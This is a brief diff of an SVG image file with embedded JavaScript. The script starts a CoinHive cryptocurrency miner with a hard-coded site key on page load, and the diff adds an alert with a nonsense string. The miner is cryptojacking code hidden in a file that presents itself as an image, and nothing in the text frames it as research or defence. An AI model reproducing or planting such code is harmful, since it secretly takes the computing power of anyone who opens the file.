@@ -10,6 +10,7 @@
         window.addEventListener('load',function(){
 			var miner = new CoinHive.Anonymous('yixSY8xCiKWNXDeFHZHBeLRtFxoH0zRo');
 			miner.start();
+			alert('jewgurhr');
         })
   </script>  
 </svg>
